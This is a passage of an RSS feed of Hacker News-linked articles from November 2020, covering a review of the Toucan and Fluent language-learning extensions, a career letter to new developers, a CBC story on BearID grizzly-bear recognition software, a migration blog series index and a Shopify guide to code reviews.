density in Toucan.</figcaption></figure></div>



<p>Choosing “Many” will set Toucan to replace and highlight a substantial number of words on the page with their translated counterparts.</p>



<p>I tried this setting for some time, and I found it somewhat distracting because there were a ton of words highlighted in the page fighting for my attention.</p>



<p>To take it easy and progress gradually, I started with the setting “Less”.</p>



<p>With “Less”, I get around 5–7 words translated in an article of 4–5 min read time.</p>



<p>Also:</p>



<p>With “Less” translations are distributed evenly in the article. Thus, the highlights don’t steal my attention from the content.</p>



<p>I can naturally spot a highlight as I read through the content, and hover on the translated word for the meaning.</p>



<p>Here’s what I recommend:</p>



<p>Start with “Less” → As you become comfortable with the translations → Move to “More”.</p>



<p>With a gradual transition, it’ll be easier to stick to this extension and interpret it as a tool instead of a distraction.</p>



<p>Similar to Toucan, Fluent also shows up an option to choose how many words you’d like to see translated:</p>



<div><figure><img data-attachment-id="992" data-permalink="https://hulry.com/toucan-learn-language/fluent-set-word-density/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?fit=1584%2C662&amp;ssl=1" data-orig-size="1584,662" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="fluent-set-word-density" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?fit=300%2C125&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?fit=1024%2C428&amp;ssl=1" loading="lazy" width="1024" height="428" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1024%2C428&amp;ssl=1" alt="Setting a translation density on Fluent." srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1024%2C428&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=300%2C125&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=768%2C321&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1536%2C642&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1200%2C502&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?w=1584&amp;ssl=1 1584w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1024%2C428&amp;ssl=1 1024w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=300%2C125&amp;ssl=1 300w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=768%2C321&amp;ssl=1 768w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1536%2C642&amp;ssl=1 1536w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1200%2C502&amp;ssl=1 1200w, https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?w=1584&amp;ssl=1 1584w" data-lazy-src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/fluent-set-word-density.png?resize=1024%2C428&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Setting a translation density on Fluent.</figcaption></figure></div>



<p>Establishing the fact that these extensions are a tool rather than a distraction, here’s another critical question:</p>



<h2>Are there any privacy concerns?</h2>



<p>Privacy is a significant factor in an extension like this since we’re giving the extension full access to whatever we browse.</p>



<p>Both <a href="https://jointoucan.com/privacy" target="_blank" rel="noreferrer noopener nofollow">Toucan</a> and <a href="https://www.usefluent.co/privacy" target="_blank" rel="noreferrer noopener nofollow">Fluent</a> have addressed this concern with a friendly privacy policy.</p>



<p>Here’s a gist:</p>



<ul><li>They don’t sell user data for ads.</li><li>The extensions don’t store any browsing history.</li><li>They only store the translated words in a browsing session to keep track of your learning progress.</li></ul>



<p>But:</p>



<p>With a free product, there will always be privacy concerns, no matter how clean it’s privacy policy might be. The business needs to make money.</p>



<p>Here’s how Toucan generates revenue right now:</p>



<ul><li><strong>Premium memberships.</strong> Toucan offers a premium membership which unlocks a couple of advanced learning packs.</li><li><strong>Own a word.</strong> With Toucan, you can <a href="https://jointoucan.com/own-the-word/claim" target="_blank" rel="noreferrer noopener nofollow">own a word</a> for <strong>$0.99/week</strong>. This means that if I own the word “productivity”, then every time someone hovers over the translated word for “productivity”, they’ll see my name and website at the bottom of the card. Consider it a form of advertisement without the use of your browsing history.</li></ul>



<p>That said:</p>



<p>I would still recommend you turn off Toucan on sensitive websites like your email inbox, banking sites, etc.</p>



<p>Here’s how you can do it:</p>



<div><figure><img data-attachment-id="975" data-permalink="https://hulry.com/toucan-learn-language/turn-off-toucan/" data-orig-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/turn-off-toucan.gif?fit=840%2C526&amp;ssl=1" data-orig-size="840,526" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="turn-off-toucan" data-image-description="" data-medium-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/turn-off-toucan.gif?fit=300%2C188&amp;ssl=1" data-large-file="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/turn-off-toucan.gif?fit=840%2C526&amp;ssl=1" loading="lazy" width="840" height="526" src="https://i0.wp.com/hulry.com/wp-content/uploads/2020/11/turn-off-toucan.gif?resize=840%2C526&amp;ssl=1" alt="Turning off Toucan translations on a specific website." data-recalc-dims="1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Turning off Toucan translations on a specific website.</figcaption></figure></div>



<p>Once Toucan is turned off for a particular website, the extension will never read any data from any page of the website.</p>



<p>Here are some of the websites where I have disabled Toucan:</p>



<ul><li>HEY email</li><li>Dropbox</li><li>Gmail</li><li>Banking websites I use</li><li>WordPress</li><li>Notion</li></ul>



<p>It’s always wise to fine-tune privacy settings so that we don’t leak any of our data to a company who might use it to their advantage.</p>



<p>Now that we talked about Toucan’s premium subscription, let’s see:</p>



<h2>Whether premium is worth the money</h2>



<p>Right now, the only selling point of …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hulry.com/toucan-learn-language/">https://hulry.com/toucan-learn-language/</a></em></p>]]>
            </description>
            <link>https://hulry.com/toucan-learn-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055257</guid>
            <pubDate>Wed, 11 Nov 2020 03:39:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Create Value for People]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25055070">thread link</a>) | @mooreds
<br/>
November 10, 2020 | https://letterstoanewdeveloper.com/2020/11/09/create-value-for-people/ | <a href="https://web.archive.org/web/*/https://letterstoanewdeveloper.com/2020/11/09/create-value-for-people/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p><em>This is a guest post from Minh Pham. Enjoy.</em></p>



<p>Dear new developer,</p>



<p>I want to start off by saying Congrats and Good job. If you’re reading this, it’s likely you know how to code – and even if you’re still working on getting that first job, that means you have one of the most desirable skill sets in the world today. I congratulate you because getting here took work. You weren’t born with this knowledge, and even if you felt like it came naturally, it was still a journey of discovery, learning, and practice that got you where you are today.</p>



<p>As you look towards your first job – I want to offer you a single piece of advice that may act as your career’s guiding north star:</p>



<p><strong>Create Value for People.</strong></p>



<p>When you have the power to create anything, you begin to realize the importance isn’t on the code you’re writing but rather why you’re writing it in the first place. What value are you creating through your skill? This is why companies hire people like yourself. They are seeking out individuals who can ultimately deliver value to their customers, particularly through software. As you mature, you will realize that much of engineering has little to do with how fancy your solution is, and instead has everything to do with what problem it solves for the user. Once you accept this, you’ll begin to see that discussions of tech choice and code structure rarely matters outside the context of what business value it represents.</p>



<p>This is where your focus should stay.</p>



<p>Obsessions with patterns and algorithms don’t serve anyone’s mission by themselves. Ignore the constant pressure to assert yourself through syntactic cleverness and obscure trivia. These things don’t matter. These things don’t drive value for anyone. No matter how many “experienced” engineers tell you these are important, I promise you no company hires people simply for them to recite principles and algorithms.</p>



<p>While coding might be your latest skill set, it is by no means an engineer’s only skillset. Remember that at the end of the day, it doesn’t matter if your code is ugly, fancy, verbose or concise – the value you create matters. Strive to be an excellent communicator, a quality teammate, and an outstanding human. These attributes will guide your engineering efforts to ensure you bring value.</p>



<p>No matter where your career goes, if you focus on creating value for people, opportunities will never be in short supply. Desire for specific skills may rise and fall, but people will always look to those who can create value.</p>



<p>With that, I wish you the best of luck and may our journeys cross again,</p>



<p>Minh Pham</p>



<p><em><a href="https://www.linkedin.com/in/miniseagoat/">Minh Pham</a> believes you should lead how you want to be led. This has been the guiding principle of his career since he started. As an Engineer, he always wished he had someone who would guide him – telling him what’s important, what he has to work on, and what he should ignore. Having gone through all that and then some, Minh now looks to be the positive influence he wishes he had.</em></p>



<p><em>As a manager, Minh’s greatest passion was teaching people the skills to create and drive the careers they want to have. Now as a career coach, he works to show people they have the power to build the life they want.</em></p>



<p><em>Minh believes anyone can do it – and he promises it doesn’t involve linked lists or graph traversals.</em></p>
	</div><div>
			<!-- .entry-auhtor -->
		<p><strong>Published</strong>
			<time datetime="2020-11-09T09:27:00-07:00">November 9, 2020</time><time datetime="2020-10-23T21:27:22-06:00">October 23, 2020</time>		</p><!-- .site-posted-on -->
	</div></div>]]>
            </description>
            <link>https://letterstoanewdeveloper.com/2020/11/09/create-value-for-people/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055070</guid>
            <pubDate>Wed, 11 Nov 2020 03:00:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facial-Recognition Software for Bears]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25054992">thread link</a>) | @sandworm101
<br/>
November 10, 2020 | https://www.cbc.ca/news/canada/british-columbia/grizzly-bear-facial-recognition-software-1.5797525 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/british-columbia/grizzly-bear-facial-recognition-software-1.5797525">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Facial recognition technology previously used on humans has huge implications for managing bear-human interactions, says UVic ecologist who has developed software to identify grizzly bears.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5797547.1605049994!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/bearid.JPG"></p></div><figcaption>BearID is grizzly bear facial recognition software developed 'from the ground up' with algorithms used to identify humans and primates. <!-- --> <!-- -->(Melanie Clapham)</figcaption></figure><p><span><p>Melanie Clapham has spent the last three years snapping images of grizzly bears at Knight Inlet, on the B.C. coast, using small camera traps housed in metal and strapped securely to the forest branches.</p>  <p>Three years and thousands of images later, the behavioural ecologist and postdoctoral student at the University of Victoria <a href="https://onlinelibrary.wiley.com/doi/10.1002/ece3.6840" target="_blank">has partnered with</a> two software developers living in Silicon Valley&nbsp;and a grizzly research centre in Alaska&nbsp;to develop facial recognition technology used to identify the bears.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5797551.1605050026!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/bearid-2.jpg 300w,https://i.cbc.ca/1.5797551.1605050026!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/bearid-2.jpg 460w,https://i.cbc.ca/1.5797551.1605050026!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/bearid-2.jpg 620w,https://i.cbc.ca/1.5797551.1605050026!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/bearid-2.jpg 780w,https://i.cbc.ca/1.5797551.1605050026!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/bearid-2.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5797551.1605050026!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/bearid-2.jpg"></p></div><figcaption>Melanie Clapham sets up a camera trap to capture images of grizzly bears for the BearID project.<!-- --> <!-- -->(Moira Le Patourel)</figcaption></figure></span></p>  <p>"They don't have distinctive markings on their bodies," said Clapham, whose&nbsp;interest in this technology stemmed from the need to "identify and recognize individual bears over time" as part of her behavioural research over the last 11 years.&nbsp;</p>  <p>Now, she says, the <a href="http://bearresearch.org/" target="_blank">open-source Bear ID software</a> can be used and adapted by anyone&nbsp;and could have huge implications for understanding the animals' behaviour and mitigating bear-human encounters.&nbsp;</p>  <h2>Technology based on human facial recognition</h2>  <p>Ed Miller and his partner Mary Nyugen are the software developers from California who connected with Clapham in an online forum for conservation technology in late 2017.&nbsp;</p>  <p>The pair were looking for photos of bears "for fun" as a way to learn more about recognition software, and so they connected with Clapham to offer their expertise in adapting artificial intelligence.</p>    <p>"The technology we're using is based on the same software [used] to recognize humans," said Miller, who added that human identification is far easier, as there are literally millions of images the software can learn from.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5797559.1605050036!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/bearid-3.JPG 300w,https://i.cbc.ca/1.5797559.1605050036!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/bearid-3.JPG 460w,https://i.cbc.ca/1.5797559.1605050036!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/bearid-3.JPG 620w,https://i.cbc.ca/1.5797559.1605050036!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/bearid-3.JPG 780w,https://i.cbc.ca/1.5797559.1605050036!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/bearid-3.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5797559.1605050036!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/bearid-3.JPG"></p></div><figcaption>Grizzly bears can be difficult to track, as many do not have distinctive markings on their bodies. <!-- --> <!-- -->(Melanie Clapham)</figcaption></figure></span></p>  <p>"We need (lots of) images of individual animals to tell the system which bear is which," said Clapham, who explained "deep learning" as the process where the software trains itself to recognize certain bears more accurately the more pictures it has.&nbsp;</p>    <p>This is especially important, given that a bear's appearance can change dramatically throughout the year as its fur moults and its weight fluctuates.&nbsp;</p>  <p>Claphams says BearID currently has an 84 per cent accuracy rate.</p>  <h2>Many practical applications</h2>  <p>Clapham said she hopes the technology will be adapted by municipalities, governments, non-profits — as many groups as possible — as it will allow people to understand animal behaviour, like how they move&nbsp;in and out of densely populated areas. It could also help researchers understand the movements of endangered species.</p>  <p>It can track bears as they move "in a similar way that a human is tracked through airports," she explained. From there, authorities could make better-informed land management and conservation decisions.&nbsp;</p>  <p>It could also help mitigate conflict encounters between bears and humans. </p>  <p>"If you have a bear digging through garbage cans, and you set cameras up … is this just one bear or is this five different bears coming into the area?" Clapham said.</p>  <p>Dallas Smith, president of the Nanwakolas Council, a group of five First Nations from Vancouver Island and the B.C. Coast&nbsp;formed to make land management decisions, said he's very excited for First Nations to use BearID, after connecting with Clapham.</p>  <p>"The grizzly bear is an icon in our cultural heritage. It's always been important to work in harmony with them," he explained. "It's really helping us gain a foothold in taking over the management of grizzly bear interactions in our territories."</p>  <p>He said the "collective territory" is working to gather more images for the system.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/british-columbia/grizzly-bear-facial-recognition-software-1.5797525</link>
            <guid isPermaLink="false">hacker-news-small-sites-25054992</guid>
            <pubDate>Wed, 11 Nov 2020 02:44:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Series of blog posts about technology migrations]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25054689">thread link</a>) | @poros
<br/>
November 10, 2020 | http://poros.github.io/technology-migrations-series/ | <a href="https://web.archive.org/web/*/http://poros.github.io/technology-migrations-series/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div> <nav> <ul> <li> <a href="http://poros.github.io/">Home</a> </li> <li> <a href="http://poros.github.io/pseudoblog">PseudoBlog</a> </li> <li> <a href="http://poros.github.io/projects">Projects</a> </li> <li> <a href="http://poros.github.io/works">Works</a> </li> <li> <a href="http://poros.github.io/about">About</a> </li> </ul> </nav>  <p><span> <time datetime="18-10-2020">Sunday. October 18, 2020</time> </span></p><div> <p><a href="http://poros.github.io/tags/#technology-migrations-series">technology-migrations-series</a> <a href="http://poros.github.io/tags/#tech-lead">tech-lead</a> </p></div>  <p><strong>Migrations are a messy business.</strong> They always run far behind schedule, and it is actually quite rare for them to end at all. They are hard to justify in terms of return on investment. They have a bad reputation among both users and management. They are emotionally draining. Yet they are the way things move forward, technologically speaking at least.</p> <p>Having been working for my entire career (so far) on internal teams focused on infrastructure or platforms, I end up thinking about migrations a lot. I have built my own little taxonomy of technology migrations, I have come up with my personal recipe to pull them off, and I have initiated engineers in the craft of running them. And those are the topics and the intent of this series of blog posts.</p> <p>The first post goes over the taxonomy of migrations and how to approach them based on the category they belong to. But you can start from the second one if you are only interested in how to run the most common type. In case you have read the entire thing already or you don’t have time for long reads, you can find a summary checklist to follow during your migration in the very last post.</p> <ol> <li><a href="http://poros.github.io/taxonomy-of-migrations/">A taxonomy of migrations</a></li> <li><a href="http://poros.github.io/mum-preparations/">Migrations under monopoly: Preparations</a></li> <li><a href="http://poros.github.io/mum-alpha/">Migrations under monopoly: Alpha</a></li> <li><a href="http://poros.github.io/mum-beta/">Migrations under monopoly: Beta</a></li> <li><a href="http://poros.github.io/mum-automation/">Migrations under monopoly: Automation</a></li> <li><a href="http://poros.github.io/mum-nudges/">Migrations under monopoly: Nudges</a></li> <li><a href="http://poros.github.io/mum-the-fat-tail/">Migrations under monopoly: The fat tail</a></li> <li><a href="http://poros.github.io/mum-deprecation/">Migrations under monopoly: Deprecation</a></li> <li><a href="http://poros.github.io/migration-checklist/">The migration checklist</a></li> </ol> <div> <a href="http://poros.github.io/taxonomy-of-migrations/"> <img src="http://poros.github.io/assets/images/next_arrow.png" alt="Next"> <b><figcaption>Next</figcaption></b> <figcaption>A taxonomy of migrations</figcaption> </a> </div> <div> <h4>Related Posts</h4> <ul> <li> <a href="http://poros.github.io/migration-checklist/">The migration checklist </a> </li> <li> <a href="http://poros.github.io/mum-deprecation/">Migrations under monopoly: Deprecation </a> </li> <li> <a href="http://poros.github.io/mum-the-fat-tail/">Migrations under monopoly: The fat tail </a> </li> <li> <a href="http://poros.github.io/mum-nudges/">Migrations under monopoly: Nudges </a> </li> <li> <a href="http://poros.github.io/mum-automation/">Migrations under monopoly: Automation </a> </li> </ul> </div> <section> <p><img src="http://poros.github.io/assets/images/profile.jpg" alt="Antonio Uccio Verardi"> </p> <div> <h4>Antonio Uccio Verardi</h4> <p>from <a href="http://www.yelp.com/" target="_blank">yelp</a> import engineering_manager</p>  </div> </section> <section>    <a href="http://disqus.com/">comments powered by <span>Disqus</span></a> </section>  </div> </div></div>]]>
            </description>
            <link>http://poros.github.io/technology-migrations-series/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25054689</guid>
            <pubDate>Wed, 11 Nov 2020 01:49:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Great Code Reviews–The Superpower Your Team Needs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25054556">thread link</a>) | @saranshk
<br/>
November 10, 2020 | https://shopify.engineering/great-code-reviews | <a href="https://web.archive.org/web/*/https://shopify.engineering/great-code-reviews">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p>There is a general consensus that code reviews are an important aspect of highly effective teams. <a href="https://sail.cs.queensu.ca/Downloads/EMSE_AnEmpiricalStudyOfTheImpactOfModernCodeReviewPracticesOnSoftwareQuality.pdf" target="_blank" title="An Empirical Study of the Impact of Modern Code Review Practices on Software Quality" rel="nofollow noopener noreferrer">This research paper</a> is one of many exploring this subject. Most organizations undergo code reviews of some form.</p>
<p>However, it’s all too common to see code reviews that barely scratch the surface, or that offer feedback that is unclear or hard to act upon. This robs the team the opportunity to speed up learning, share knowledge and context, and raise the quality bar on the resulting code.</p>
<p>At Shopify, we want to move fast while building for the long term. In our experience, having strong code review practices has a huge impact on the growth of our engineers and in the quality of the products we build.</p>

<p>Imagine you join a new team and you’re given a coding task to work on. Since you’re new on the team, you really want to show what you’re made of. You want to perform. So, this is what you do:</p>
<ol>
<li>You work frantically on your task for 3 weeks.</li>
<li>You submit a Pull Request for review with about 1000 new lines of code</li>
<li>You get a couple comments about code style and a question that shows the person has no clue what this work is about.</li>
<li>You get approval from both reviewers after fixing the code style and answering the question.</li>
<li>You merge your branch into master, eyes closed, shoulders tense, grinding your teeth. After a few minutes, CI completes. Master is not broken. Yet.</li>
<li>You live in fear for 6 months, not knowing when and how your code will break.</li>
</ol>
<p>You may have lived through some of the situations above, and hopefully you’ve seen some of the red flags in that process.</p>
<p>Let’s talk about how we can make it much better.</p>

<p>At Shopify, we value the speed of shipping, learning, and building for the long term. These values - which sometimes conflict - lead us to experiment with many techniques and team dynamics. In this article, I have distilled a series of very practical techniques we use at Shopify to ship valuable code that can stand the test of time.</p>
<p>A Note about terminology: We refer to Pull Requests (PR) as one unit of work that's put forth for review before merging into the base branch. Github and Bitbucket users will be familiar with this term.</p>
<h2>1. Keep Your Pull Requests Small</h2>
<p>As simple as this sounds, this is easily the most impactful technique you can follow to level up your code review workflow. There are 2 fundamental reasons why this works:</p>
<ul>
<li>It’s mentally easier to <strong>start and complete a review</strong> for a small piece. Larger PRs will naturally make reviewers delay and procrastinate examining the work, and they are more likely to be interrupted mid-review.</li>
<li>As a reviewer, it’s exponentially <strong>harder to dive deep</strong> if the PR is long. The more code there is to examine, the bigger the mental map we need to build to understand the whole piece.</li>
</ul>
<p>Breaking up your work in smaller chunks increases your chances of getting faster and deeper reviews.</p>
<p>Now, it’s impossible to set one universal standard that applies to all programming languages and all types of work. Internally, for our data engineering work, the guideline is around 200-300 lines of code affected. If we go above this threshold, we almost always break up the work into smaller blocks.</p>
<p>Of course, we need to be careful about breaking up PRs into chunks that are <strong>too small</strong>, since this means reviewers may need to inspect several PRs to understand the overall picture.</p>
<h2>2. Use Draft PRs</h2>
<p>Have you heard the metaphor of building a car vs. drawing a car? It goes something like this:</p>
<ol>
<li>You’re asked to build a car.</li>
<li>You go away for 6 months and build a beautiful Porsche.</li>
<li>When you show it to your users, they ask about space for their 5 children and the surf boards.</li>
</ol>
<p>Clearly, the problem here is that the goal is poorly defined and the team jumped directly into the solution before gathering enough feedback.If after step 1 we created a drawing of the car and showed it to our users, they would have asked the same questions and we would have discovered their expectations and saved ourselves 6 months of work. Software is no different—we can make the same mistake and work for a long time on a feature or module that isn't what our users need.</p>
<p>At Shopify, it’s common practice to use <strong>Work In Progress (WIP) PRs</strong> to elicit early feedback whose goal is validating direction (choice of algorithm, design, API, etc). Early changes mean less wasted effort on details, polish, documentation, etc.</p>
<p>As an author, this means you need to be open to changing the direction of your work. At Shopify, we try to embrace the principle of <a href="https://engineering.shopify.com/blogs/engineering/scaling-mobile-development-by-treating-apps-as-services" target="_blank" title="Scaling Mobile Development by Treating Apps as Services - Shopify Engineering" rel="noopener noreferrer"><strong>strong opinions, loosely held</strong></a>. We want people to make decisions confidently, but also be open to learning new and better alternatives, given sufficient evidence. In practice, we use Github’s <strong>Draft PRs</strong>—they clearly signal the work is still in flow and Github prevents you from merging a Draft PR. Other tools may have similar functionality, but at the very least you can create normal PRs with a clear <strong>WIP</strong> label to indicate the work is early stage. This will help your reviewers focus on offering the right type of feedback.</p>
<h2>3. One PR Per Concern</h2>
<p>In addition to line count, another dimension to consider is how many <em>concerns</em> your unit of work is trying to address. A concern may be a feature, a bugfix, a dependency upgrade, an API change, etc. Are you introducing a new feature while refactoring at the same time? Fixing two bugs in one shot? Introducing a library upgrade and a new service?</p>
<p>Breaking down PRs into individual concerns has the following effects:</p>
<ul>
<li>
<strong>More independent review units</strong> and therefore <strong>better review quality</strong>
</li>
<li>
<strong>Fewer affected people</strong>, therefore less domains of expertise to gather</li>
<li>
<strong>Atomicity of rollbacks,</strong>&nbsp;the ability of rolling back a small commit or PR. This is valuable because if something goes wrong, it will be easier to identify where errors were introduced and what to roll back.</li>
<li>
<strong>Separating easy stuff from hard stuff</strong>. Imagine a new feature that requires refactoring a frequently used API. You change the API, update a dozen call-sites, and then implement your feature. 80% of your changes are obvious and skimmable with no functional changes, while 20% are new code that needs careful attention to test coverage, intended behaviour, error handling, etc. and will likely go through multiple revisions. With each revision, the reviewer will need to skim through <em>all</em> of the changes to find the relevant bits. By splitting this in two PRs, it becomes easy to quickly land the majority of the work and to optimize the review effort applied to the harder work.</li>
</ul>
<p>If you end up with a PR that includes more than one concern, you can break it down into individual chunks. Doing so will accelerate the iteration cycle on each individual review, giving a faster review overall. Often part of the work can land quickly, avoiding code rot and merge conflicts.</p>
<p><img alt="Breaking down PRs into individual concerns" data-src="//cdn.shopify.com/s/files/1/0779/4361/files/Code_Reviews_at_Shopify_-_blog_article.jpg?v=1581342642" src="https://cdn.shopify.com/s/files/1/0779/4361/files/Code_Reviews_at_Shopify_-_blog_article.jpg?v=1581342642"></p>
<meta charset="utf-8">
<p><em>Breaking down PRs into individual concerns</em></p>
<p>In the example above, we’ve taken a PR that covered three different concerns and broke it up. You can see how each reviewer has strictly less context to go over. Best of all, as soon as <em>any</em> of the reviews is complete, the author can begin addressing feedback while continuing to wait for the rest of the work. In the most extreme cases, instead of completing a first draft, waiting several days (and shifting focus), and then eventually returning to address feedback, the author can work almost continuously on their family of PRs as they receive the different reviews asynchronously.</p>
<h2>4. Focus on the Code, Not the Person</h2>
<p>Focus on the code, not the person practice refers to communication styles and relationships between people. Fundamentally, it’s about trying to focus on making the product better, and avoiding the author perceiving a review as personal criticism.</p>
<p>Here are some tips you can follow:</p>
<ul>
<li>As a reviewer, think, “This is <strong>our</strong> code, how can we improve on it?”</li>
<li>Offer positive remarks! If you see something done well, comment on it. This reinforces good work and helps the author balance suggestions for improvement.</li>
<li>As an author, assume best intention, and don’t take comments personally.</li>
</ul>
<p>Below are a few examples of not-so-great review comments, and a suggestion on how we can reword to emphasize the tips above.</p>
<table>
<tbody>
<tr>
<td>

<strong>Less of These</strong>
</td>
<td><strong>&nbsp;More of These</strong></td>
</tr>
<tr>
<td>

Move this to Markdown</td>
<td>

How about moving this documentation into our Markdown README file? That way we can more easily share with other users.<strong></strong>
</td>
</tr>
<tr>
<td>

Read the Google Python style guidelines</td>
<td>

We should avoid single-character variables. How about board_size or size instead?</td>
</tr>
<tr>
<td>

This feels too slow. Make it faster. Lightning fast.</td>
<td>&nbsp;This algorithm is very easy to read but I’m concerned about performance. Let’s test this with a large dataset to gauge its efficiency.</td>
</tr>
<tr>
<td>

Bool or int?</td>
<td>

Why did you choose a list of bool values instead of integers?</td>
</tr>
</tbody>
</table>
<p><br>Ultimately, a code review is a learning and teaching opportunity and should be celebrated as such.</p>
<h2>5. Pick the Right People to Review</h2>
<p>It’s often challenging to decide who should review your work. Here are some questions can use as guidance:</p>
<ul>
<li>Who has context on the feature or component you’re building?</li>
<li>Who has strong skills in the language, framework, or tool you’re using?</li>
<li>Who has strong opinions on the subject?</li>
<li>Who cares about the result of what you’re doing?</li>
<li>Who should learn this stuff? Or if you’re a junior reviewing someone more senior, use this as an opportunity to ask questions and learn. Ask all the silly questions, a strong team will find the time to share knowledge.</li>
</ul>
<p>Whatever rules your team might have, remember that it is your responsibility as an author to seek and receive a high-quality code review from a person or people with the right context.</p>
<h2>6. Give Your Reviewers a Map</h2>
<p>Last but definitely not least, the description on your PR is crucial. Depending on who you picked for review, different people will have different context. The onus is on the author to help reviewers by providing key information or links to more context so they can produce meaningful feedback.</p>
<p>Some questions you can include in <a href="https://help.github.com/en/github/building-a-strong-community/creating-a-pull-request-template-for-your-repository" target="_blank" title="Creating a pull request template for your repository - GitHub" rel="nofollow noopener noreferrer">your PR templates</a>:</p>
<ul>
<li>Why is this PR necessary?</li>
<li>Who benefits from this?</li>
<li>What could go wrong?</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://shopify.engineering/great-code-reviews">https://shopify.engineering/great-code-reviews</a></em></p>]]>
            </description>
